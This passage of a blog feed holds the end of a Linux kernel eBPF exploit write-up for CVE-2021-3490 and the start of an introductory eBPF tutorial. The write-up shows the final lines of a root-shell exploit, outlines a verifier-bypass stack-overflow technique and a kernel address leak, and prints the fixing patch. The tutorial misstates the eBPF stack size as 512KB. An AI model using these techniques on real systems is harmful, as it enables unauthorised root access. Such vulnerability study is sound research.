class="hljs-comment">/* record the log in to file here */</span><br>    log_fd = open(<span class="hljs-string">&quot;./log.txt&quot;</span>, O_RDWR | O_CREAT);<br>    <span class="hljs-keyword">if</span> (log_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create log file!&quot;</span>);<br>    &#125;<br>    write(log_fd, bpf_log_buf, <span class="hljs-built_in">strlen</span>(bpf_log_buf));<br>    close(log_fd);<br><br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行即可完成提权：</p><p><img src="https://s2.loli.net/2023/06/07/x9RAdDMlZr4wF65.png" alt="image.png"></p><blockquote><p>第一次真正从头开始做 eBPF 相关的利用，说实话还是挺有意思的，不过虚拟机的各种实现细节确实比想象中要庞大得多（<del>那一天，a3 终于回忆起本科阶段做用户态 vm pwn 逆向半天逆到头大的痛苦</del>）</p></blockquote><h2 id="Extra-New-ALU-Sanitation-bypass"><a href="#Extra-New-ALU-Sanitation-bypass" class="headerlink" title="Extra. New ALU Sanitation bypass"></a>Extra. New ALU Sanitation bypass</h2><p>在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=7fedb63a8307dda0ec3b8969a3b233a1dd7ea8e0">这个 commit</a> 中 ALU Sanitation 又得到了进一步的加强：</p><ul><li><code>alu_limit</code> 的计算方式发生了改变，不是使用指针寄存器的当前位置，而是使用一个 <code>offset</code> 寄存器</li><li>被认为是常数的寄存器赋值<strong>会被直接更改为常量赋值</strong></li></ul><p>这两个新特性的引入<strong>使得本文所用的攻击方法近乎完全失效</strong>，不过这并不代表我们不能完成利用，在 <a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf-v2</a> 中来自 vidar-team 的 chuj 师傅展示了一个新的技巧——由于 <code>bpf_skb_load_bytes()</code> 会将一个 <code>sk_buff</code> 的数据读到栈上，因此我们可以利用运行时为 1、verifier 确信为 0 的寄存器构造一个较长的 <code>len</code> 参数，<strong>从而使得数据拷贝时发生栈溢出</strong></p><p>我们或许还需要额外的办法泄露内核地址，一个可行的方式是直接造成 kernel oops 后通过 dmesg 泄露出内核信息，这个技巧对于总会设置 <code>oops=panic</code> 的 CTF 题并不可用，但是<strong>大部分的真实世界环境其实都不会在 soft panic 发生时直接 panic</strong> （<code>/proc/sys/kernel/panic_on_oops == 0</code>），因此这个方法的可行性其实还是挺高的</p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03. 漏洞修复"></a>0x03. 漏洞修复</h1><p>在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">这个 commit</a> 中完成了对漏洞的修补操作,漏洞的修复方式也比较简单，只需要将缺失的设置 32 位边界的操作补充上就行：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs diff"><br><span class="hljs-comment">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="hljs-comment">index 757476c91c984..9352a1b7de2dd 100644</span><br><span class="hljs-comment">--- a/kernel/bpf/verifier.c</span><br><span class="hljs-comment">+++ b/kernel/bpf/verifier.c</span><br><span class="hljs-meta">@@ -7084,11 +7084,10 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umax_val = src_reg-&gt;u32_max_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_and will be called so its safe</span><br><span class="hljs-deletion">- * to skip updating register for known 32-bit case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our minimum from the var_off, since that&#x27;s inherently<br>  * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.<br><span class="hljs-meta">@@ -7108,7 +7107,6 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;<br> dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;<br> &#125;<br><span class="hljs-deletion">-</span><br> &#125;<br> <br> static void scalar_min_max_and(struct bpf_reg_state *dst_reg,<br><span class="hljs-meta">@@ -7155,11 +7153,10 @@</span> static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umin_val = src_reg-&gt;u32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_or will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our maximum from the var_off, and our minimum is the<br>  * maximum of the operands&#x27; minima<br><span class="hljs-meta">@@ -7224,11 +7221,10 @@</span> static void scalar32_min_max_xor(struct bpf_reg_state *dst_reg,<br> struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_xor will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get both minimum and maximum from the var32_off. */<br> dst_reg-&gt;u32_min_value = var32_off.value;<br></code></pre></td></tr></table></figure><p>笔者认为这个修补方式还是比较成功的</p><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF. REFERENCE"></a>0xFF. REFERENCE</h1><p><a href="https://bsauce.github.io/2021/08/31/CVE-2021-3490">【kernel exploit】CVE-2021-3490 eBPF 32位边界计算错误漏洞</a></p><p><a href="https://xz.aliyun.com/t/11165">eBPF漏洞CVE-2021-3490分析与利用</a></p><p><a href="https://a1ex.online/2021/08/16/ebpf-pwn-A-Love-Story/">ebpf-pwn-A-Love-Story</a></p><p><a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf,d3bpf-v2-WP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;那一天，a3 终于回想起了被 VM Pwn 支配的恐怖&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="提权" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="eBPF" scheme="https://arttnba3.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>【EBPF.0x00】eBPF 入门指北（一）：简介</title>
    <link href="https://arttnba3.github.io/2023/05/31/EBPF_0X00/"/>
    <id>https://arttnba3.github.io/2023/05/31/EBPF_0X00/</id>
    <published>2023-05-30T19:46:24.000Z</published>
    <updated>2023-06-06T21:37:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>BEE BEE I’M A SHEEP</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>因为最近毕设搞得有点头大（←因为这个人各种摸鱼导致进度差的太多然后最后几天疯狂各种赶工），所以看点和毕设无关的东西（这样毕设不是更加做不完了嘛（悲）</p></blockquote><p>笔者一直想着有机会深入学习一下 eBPF 相关的东西，可惜总是习惯性一头扎进源码各种繁杂的细节当中迷失自己然后放弃（悲）</p><p><del>于是趁现在有时间（？）</del> 虽然现在没什么时间，笔者还是想给这玩意先开个头写第一篇博客，毕竟只要开了一个头之后后面的事情也就会简单得多了吧（大嘘）</p><h2 id="What-is-eBPF"><a href="#What-is-eBPF" class="headerlink" title="What is eBPF?"></a>What is eBPF?</h2><p><strong>伯克利包过滤器</strong>（Berkeley Packet Filter）是一个 Linux kernel 中用以对来自于链路层的数据包进行过滤的架构，其位于内核中的架构如下图所示：</p><p><img src="https://s2.loli.net/2022/07/21/Cpf7VY9z5lsG2u3.png" alt="image.png"></p><p>相比起传统的数据包过滤器而言，BPF <strong>在内核中</strong>实现了一个新的<strong>虚拟机</strong>设计，通过<strong>即时编译</strong>（Just-In-Time compilation）技术将 BPF 指令翻译为 BPF 虚拟机的字节码，可以高效地工作在基于寄存器结构的 CPU 上</p><p>Linux kernel 自 3.18 版本起提供了<strong>扩展伯克利包过滤器</strong>（<strong>e</strong>xtended <strong>BPF</strong>，即 <code>eBPF</code>），其应用范围更广，能够被应用于更多的场景，原来的 BPF 被称为 <strong>c</strong>lassic <strong>BPF</strong>（cBPF），且目前基本上已经被废弃，Linux 会将 cBPF 字节码转化为 eBPF 字节码再执行</p><p>作为一个<strong>位于内核层面的虚拟机</strong>，eBPF 无疑为攻击者提供了一个相当大的新攻击面，因此也成为近几年内核利用中的“大热门”，本篇博客中笔者将简述 eBPF 的基本原理</p><blockquote><p>本篇文章中涉及到的 Linux kernel 源码来自版本 6.3.2</p></blockquote><h1 id="0x01-eBPF-的基本架构"><a href="#0x01-eBPF-的基本架构" class="headerlink" title="0x01.eBPF 的基本架构"></a>0x01.eBPF 的基本架构</h1><h2 id="一、eBPF-的运行过程"><a href="#一、eBPF-的运行过程" class="headerlink" title="一、eBPF 的运行过程"></a>一、eBPF 的运行过程</h2><p>Linux 下 eBPF 的整体架构如下图所示：</p><p><img src="https://s2.loli.net/2022/03/20/HfExF3JwKX9nOvi.png" alt="image.png"></p><ul><li>用户进程首先在用户空间编写相应的 BPF 字节码程序，传入内核</li><li>内核通过 <code>verifier</code> 对字节码程序进行安全性检查，通过检查后便通过 JIT 编译运行，eBPF 程序主要分为如下类型：<ul><li><code>kprobes</code> ：内核中的动态跟踪，可以跟踪至内核中的函数入口或返回点</li><li><code>uprobes</code> ：用户空间中的动态跟踪，与 kprobes 不同的是跟踪的函数位于用户程序中</li><li><code>tracepoints</code> ：内核中的静态跟踪</li><li><code>perf_events</code> ：定时采样与 PMC</li></ul></li><li>映射（map）作为用以保存数据的通用结构，可以在不同的 eBPF 程序之间或是用户进程与内核间共享数据</li></ul><blockquote><p>不同版本的 eBPF 所支持的功能是不同的，参见<a href="https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md">这↑里↓</a></p><table><thead><tr><th>version</th><th>功能</th></tr></thead><tbody><tr><td>4.1</td><td>kprobe support</td></tr><tr><td>4.4</td><td>Perf events</td></tr><tr><td>4.7</td><td>Tracepoints support</td></tr><tr><td>4.8</td><td>XDP core</td></tr><tr><td>4.10</td><td>cgroups support</td></tr></tbody></table></blockquote><p>一个 eBPF 程序可以被挂载到多个事件上，不同的 eBPF 程序之间可以共享同一个映射</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">tracing     tracing    tracing    packet      packet     packet<br>event A     event B    event C    on eth0     on eth1    on eth2<br> |<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           </span>|<span class="hljs-string">          ^</span><br><span class="hljs-string"> </span>|<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           v          </span>|<br> --&gt; tracing <span class="hljs-variable">&lt;--     tracing      socket    tc ingress   tc egress</span><br><span class="hljs-variable">      prog_1          prog_2      prog_3    classifier    action</span><br><span class="hljs-variable">      |  |              |           |         prog_4      prog_5</span><br><span class="hljs-variable">   |---  -----|  |------|          map_3        |           |</span><br><span class="hljs-variable"> map_1       map_2                              --| map_4 |--</span><br></code></pre></td></tr></table></figure><h2 id="二、eBPF-verifier"><a href="#二、eBPF-verifier" class="headerlink" title="二、eBPF verifier"></a>二、eBPF verifier</h2><p>在 eBPF 字节码被传入到内核空间后，其首先需要经过 <code>verifier</code> 的安全检查，之后才能进行 JIT 编译，verifier 主要检查以下几点：</p><ul><li>没有回向边（back edge）、环路（loop）、不可达（unreachable）指令</li><li>不能在指针之间进行比较，指针只能与标量进行加减（eBPF 中的标量值为不从指针派生的值），verifier 会追踪哪些寄存器包含指针、哪些寄存器包含标量值</li><li>指针运算不能离开一个 map 的“安全”边界，这意味着程序不能访问预定义的 map 外的内存，verifier 通过追踪每个寄存器值的上界与下界</li><li>不能将指针存储在 map 中或作为返回值，以避免将内核地址泄露到用户空间</li></ul><p>在 <code>kernel/bpf/verifier.c</code>  开头注释阐述如下：</p><blockquote><p>这里为了方便阅读，有的保留原文没有翻译</p><blockquote><p>比如说直接说 <code>map element key</code> 你肯定知道是什么东西，但是我要是说 <code>映射元素键</code> 那你肯定得楞一会….</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* bpf_check() 是一个静态代码分析器，其逐条遍历 eBPF 程序中的指令，</span><br><span class="hljs-comment"> * 并更新寄存器/堆栈的状态。</span><br><span class="hljs-comment"> * 条件分支的所有路径都会被分析，直到 &#x27;bpf_exit&#x27; 指令。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 首先通过深度优先搜索检查程序是否为有向无环图（Directed Acyclic Graph）</span><br><span class="hljs-comment"> * 其拒绝以下程序:</span><br><span class="hljs-comment"> * - 指令数大于 BPF_MAXINSNS </span><br><span class="hljs-comment"> * - 出现了循环 (通过后向边检测)</span><br><span class="hljs-comment"> * - 存在不可达指令 (不应当是一个森林. 程序 = 一个函数)</span><br><span class="hljs-comment"> * - 越界或畸形跳转</span><br><span class="hljs-comment"> * 接着是第一条指令展开的所有可能路径。</span><br><span class="hljs-comment"> * 由于其分析程序中所有的路径，分析的长度被限制为 64k 指令，</span><br><span class="hljs-comment"> * 即使总的指令数仅有 4k 可也能达到，但这有太多的会改变栈/寄存器的分支。</span><br><span class="hljs-comment"> * “被分析的分支”的数量被限制在 1k</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在每条指令的入口，每个寄存器都有一个类型，该指令根据指令语义改变寄存器的类型。</span><br><span class="hljs-comment"> * 若指令为 BPF_MOV64_REG(BPF_REG_1, BPF_REG_5),  则 R5 的类型会被复制给 R1</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所有的寄存器都是 64 位的</span><br><span class="hljs-comment"> * R0 - 返回寄存器</span><br><span class="hljs-comment"> * R1-R5 传参寄存器</span><br><span class="hljs-comment"> * R6-R9 callee 保存的寄存器</span><br><span class="hljs-comment"> * R10 - 只读帧指针</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在 BPF 程序起始， R1 寄存器包含一个指向 bpf_context 的指针，</span><br><span class="hljs-comment"> * 其类型为 PTR_TO_CTX.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Verifier 跟踪指针上的运算，以免:</span><br><span class="hljs-comment"> *    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),</span><br><span class="hljs-comment"> *    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -20),</span><br><span class="hljs-comment"> * 第一条指令将 R10 (FRAME_PTR) 的类型拷贝给 R1，</span><br><span class="hljs-comment"> * 第二条算术指令通过模式匹配以识别其想要构造一个指向栈内元素的指针。</span><br><span class="hljs-comment"> * 因此在第二条指令后，寄存器 R1 的类型为 PTR_TO_STACK</span><br><span class="hljs-comment"> * (以及常量 -20 被存储用作未来的栈边界检查).</span><br><span class="hljs-comment"> * 这意味着该寄存器为一个指向[栈 + 已知立即数常量]的指针</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 大部分情况下寄存器都有着 SCALAR_VALUE 类型，</span><br><span class="hljs-comment"> * 这意味着寄存器存储着一些值，但并非一个可用的指针.</span><br><span class="hljs-comment"> * (例如指针加上指针会变为 SCALAR_VALUE 类型)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当 verifier 遇到 load 或 store 指令时基寄存器（base register）的类型可以为：</span><br><span class="hljs-comment"> * PTR_TO_MAP_VALUE, PTR_TO_CTX, PTR_TO_STACK, PTR_TO_SOCKET.</span><br><span class="hljs-comment"> * 这些是 4 种被 check_mem_access() 函数所识别的指针类型.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * PTR_TO_MAP_VALUE 意为该寄存器指向 &#x27;map element value&#x27;</span><br><span class="hljs-comment"> * 可访问的范围为 [ptr, ptr + map&#x27;s value_size).</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 用以在函数调用时传值的寄存器被根据函数参数约束进行检查</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ARG_PTR_TO_MAP_KEY 便是其中一个这样的参数约束.</span><br><span class="hljs-comment"> * 其意为传递给该函数的寄存器类型必须为 PTR_TO_STACK</span><br><span class="hljs-comment"> * 且其在函数内将被作为 &#x27;pointer to map element key&#x27; 使用</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 例如，这些是 bpf_map_lookup_elem() 的参数约定:</span><br><span class="hljs-comment"> *   .ret_type = RET_PTR_TO_MAP_VALUE_OR_NULL,</span><br><span class="hljs-comment"> *   .arg1_type = ARG_CONST_MAP_PTR,</span><br><span class="hljs-comment"> *   .arg2_type = ARG_PTR_TO_MAP_KEY,</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * ret_type 表示该函数返回 &#x27;pointer to map elem value or null&#x27;</span><br><span class="hljs-comment"> * 函数希望第一个参数为一个指向 &#x27;struct bpf_map&#x27; 的常量指针，</span><br><span class="hljs-comment"> * 第二个参数则应为指向栈的指针，其会在 helper 函数内用作</span><br><span class="hljs-comment"> * 指向[map element key]的指针</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 内核侧的 helper 函数有如下形式:</span><br><span class="hljs-comment"> * u64 bpf_map_lookup_elem(u64 r1, u64 r2, u64 r3, u64 r4, u64 r5)</span><br><span class="hljs-comment"> * &#123;</span><br><span class="hljs-comment"> *    struct bpf_map *map = (struct bpf_map *) (unsigned long) r1;</span><br><span class="hljs-comment"> *    void *key = (void *) (unsigned long) r2;</span><br><span class="hljs-comment"> *    void *value;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *    这里内核可以安全地访问 &#x27;key&#x27; 与 &#x27;map&#x27; 指针, 知晓</span><br><span class="hljs-comment"> *    [key, key + map-&gt;key_size) 字节为可用的且被</span><br><span class="hljs-comment"> *    初始化在 eBPF 程序的栈上.</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 相应的 eBPF 程序或许形如:</span><br><span class="hljs-comment"> *    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),  // 这条指令后 R2 的类型为 FRAME_PTR</span><br><span class="hljs-comment"> *    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4), // 这条指令后 R2 的类型为 PTR_TO_STACK</span><br><span class="hljs-comment"> *    BPF_LD_MAP_FD(BPF_REG_1, map_fd),      // 这条指令后 R1 的类型为 CONST_PTR_TO_MAP</span><br><span class="hljs-comment"> *    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),</span><br><span class="hljs-comment"> * 这里 verifier 关注 map_lookup_elem() 的原型，会看到:</span><br><span class="hljs-comment"> * .arg1_type == ARG_CONST_MAP_PTR 以及 R1-&gt;type == CONST_PTR_TO_MAP, 这是 🆗 的,</span><br><span class="hljs-comment"> * 现在 verifier 知道该 map 有一个 R1-&gt;map_ptr-&gt;key_size 字节的 key</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 然后， .arg2_type == ARG_PTR_TO_MAP_KEY and R2-&gt;type == PTR_TO_STACK, 到现在还🆗,</span><br><span class="hljs-comment"> * 现在 verifier 检查 [R2, R2 + map&#x27;s key_size) 在栈的限制内，</span><br><span class="hljs-comment"> * 且在该调用之前被初始化.</span><br><span class="hljs-comment"> * 若🆗, verifier 接下来允许该 BPF_CALL 指令并关注</span><br><span class="hljs-comment"> * .ret_type （为 RET_PTR_TO_MAP_VALUE_OR_NULL）, 故让</span><br><span class="hljs-comment"> * R0-&gt;type = PTR_TO_MAP_VALUE_OR_NULL ，这意味着 bpf_map_lookup_elem() 函数</span><br><span class="hljs-comment"> * 返回指向 map value 的指针或 NULL.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当类型 PTR_TO_MAP_VALUE_OR_NULL 通过 &#x27;if (reg != 0) goto +off&#x27; 指令，</span><br><span class="hljs-comment"> * 在 true 分支中持有指针的寄存器将状态改变为 PTR_TO_MAP_VALUE，</span><br><span class="hljs-comment"> * 在 false 分支中同样的寄存器将状态改变为 CONST_IMM 。</span><br><span class="hljs-comment"> * 参见 check_cond_jmp_op().</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 在调用后 R0 被设为函数返回值，寄存器 R1-R5 被设为 NOT_INIT</span><br><span class="hljs-comment"> * 以表示其不再可读.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 以下引用类型表示一个对内核资源的潜在引用，</span><br><span class="hljs-comment"> * 在其第一次被分配后， BPF 程序必须检查并释放该资源:</span><br><span class="hljs-comment"> * - PTR_TO_SOCKET_OR_NULL, PTR_TO_SOCKET</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 当 verifier 遇到一个 helper 调用返回一个引用类型, </span><br><span class="hljs-comment"> * 其为该引用分配一个指针 id 并将他储存在当前的函数状态中.</span><br><span class="hljs-comment"> * 类似于将 PTR_TO_MAP_VALUE_OR_NULL 转化为 PTR_TO_MAP_VALUE 的方式，</span><br><span class="hljs-comment"> * 当类型通过一个 NULL-check 条件， PTR_TO_SOCKET_OR_NULL 变为 PTR_TO_SOCKET。</span><br><span class="hljs-comment"> * 对于状态变为 CONST_IMM 的分支，verifier会释放引用</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 对每个会分配一个引用的 helper 函数，例如 bpf_sk_lookup_tcp()，</span><br><span class="hljs-comment"> * 都有一个对应的释放函数，例如bpf_sk_release()。</span><br><span class="hljs-comment"> * 当一个引用类型传入释放函数时，verifier 同样释放引用。</span><br><span class="hljs-comment"> * 若在程序末尾仍保留有任何未检查或未释放的引用，verifier 会拒绝他</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h3 id="ALU-Sanitation"><a href="#ALU-Sanitation" class="headerlink" title="ALU Sanitation"></a>ALU Sanitation</h3><p><code>ALU Sanitation</code> 是 eBPF 中一个<strong>代码加固与运行时动态检测</strong>的框架，通过对程序正在处理的实际值进行运行时检查以弥补 verifier 静态分析的不足，这项技术通过调用 <code>fixup_bpf_calls()</code> <strong>为 eBPF 程序中的每一条指令的前面都添加上额外的辅助指令、替换部分指令</strong>等方式来实现</p><h2 id="三、eBPF-虚拟机"><a href="#三、eBPF-虚拟机" class="headerlink" title="三、eBPF 虚拟机"></a>三、eBPF 虚拟机</h2><p>eBPF 虚拟机本质上是 RISC 架构，一共有 11 个 64 位寄存器，一个程序计数器（PC）与一个固定大小的堆栈（通常为 512KB），在 x86 架构下的对应关系如下：</p><table><thead><tr><th align="center">eBPF 寄存器</th><th align="center">映射 x86_64 寄存器</th><th align="center">用途</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">rax</td><td align="center">函数返回值</td></tr><tr><td align="center">R1</td><td align="center">rdi</td><td align="center">argv1</td></tr><tr><td align="center">R2</td><td align="center">rsi</td><td align="center">argv2</td></tr><tr><td align="center">R3</td><td align="center">rdx</td><td align="center">argv3</td></tr><tr><td align="center">R4</td><td align="center">rcx</td><td align="center">argv4</td></tr><tr><td align="center">R5</td><td align="center">r8</td><td align="center">argv5</td></tr><tr><td align="center">R6</td><td align="center">rbx</td><td align="center">callee 保存</td></tr><tr><td align="center">R7</td><td align="center">r13</td><td align="center">callee 保存</td></tr><tr><td align="center">R8</td><td align="center">r14</td><td align="center">callee 保存</td></tr><tr><td align="center">R9</td><td align="center">r15</td><td align="center">callee 保存</td></tr><tr><td align="center">R10（只读）</td><td align="center">rbp</td><td align="center">堆栈指针寄存器</td></tr></tbody></table><p>r1 ~ r5 这五个寄存器用作 eBPF 中的函数调用传参，且只能保存常数或是指向堆栈的指针，因此所有的内存访问都需要先把数据加载到 eBPF 堆栈中才能使用，这种限制简化了 eBPF 的内存模型，也更方便 verifier 进行检查</p><p><img src="https://s2.loli.net/2023/05/28/68e53xiKbH4TQz7.png" alt="eBPF.png"></p><h3 id="bpf-reg-state-eBPF-寄存器状态"><a href="#bpf-reg-state-eBPF-寄存器状态" class="headerlink" title="bpf_reg_state - eBPF 寄存器状态"></a>bpf_reg_state - eBPF 寄存器状态</h3><p>在 eBPF 中，一个寄存器的状态信息使用 <code>bpf_reg_state</code> 进行表示：</p><figure class="highlight c"><table><tr><td 